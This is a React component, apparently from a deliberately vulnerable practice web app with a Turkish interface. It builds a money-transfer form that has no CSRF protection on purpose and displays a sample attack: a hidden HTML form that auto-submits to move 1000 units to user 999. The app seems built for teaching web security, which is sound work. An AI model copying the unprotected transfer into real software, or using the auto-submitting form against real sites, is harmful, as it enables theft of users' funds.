import React, { useState } from 'react';
import axios from 'axios';

function Transfer() {
  const [toUser, setToUser] = useState('');
  const [amount, setAmount] = useState('');
  const [message, setMessage] = useState('');
  const [error, setError] = useState('');

  const handleTransfer = async (e) => {
    e.preventDefault();
    setMessage('');
    setError('');

    try {
      // VULNERABILITY: No CSRF token
      const response = await axios.post('/api/transfer', {
        to: toUser,
        amount: amount
      });

      if (response.data.success) {
        setMessage('Transfer başarılı!');
        setToUser('');
        setAmount('');
      }
    } catch (err) {
      setError(err.response?.data?.error || 'Transfer başarısız');
    }
  };

  return (
    <div className="card">
      <h2>Para Transferi <span className="vulnerability-tag">CSRF</span></h2>
      
      <form onSubmit={handleTransfer}>
        <div className="form-group">
          <label>Alıcı Kullanıcı ID:</label>
          <input
            type="number"
            value={toUser}
            onChange={(e) => setToUser(e.target.value)}
            required
          />
        </div>
        <div className="form-group">
          <label>Miktar:</label>
          <input
            type="number"
            step="0.01"
            value={amount}
            onChange={(e) => setAmount(e.target.value)}
            required
          />
        </div>
        <button type="submit" className="btn btn-success">Transfer Yap</button>
        {message && <div className="success">{message}</div>}
        {error && <div className="error">{error}</div>}
      </form>

      <div style={{marginTop: '20px', padding: '15px', background: '#ffebee', borderRadius: '4px'}}>
        <h3>CSRF Saldırısı Örneği</h3>
        <p>Bu form CSRF token koruması içermiyor. Kötü niyetli bir site şu HTML ile otomatik transfer yapabilir:</p>
        <pre style={{background: '#f5f5f5', padding: '10px', borderRadius: '4px', overflow: 'auto'}}>
{`<form action="http://localhost:3001/api/transfer" method="POST">
  <input type="hidden" name="to" value="999" />
  <input type="hidden" name="amount" value="1000" />
</form>
<script>document.forms[0].submit();</script>`}
        </pre>
      </div>
    </div>
  );
}

export default Transfer;
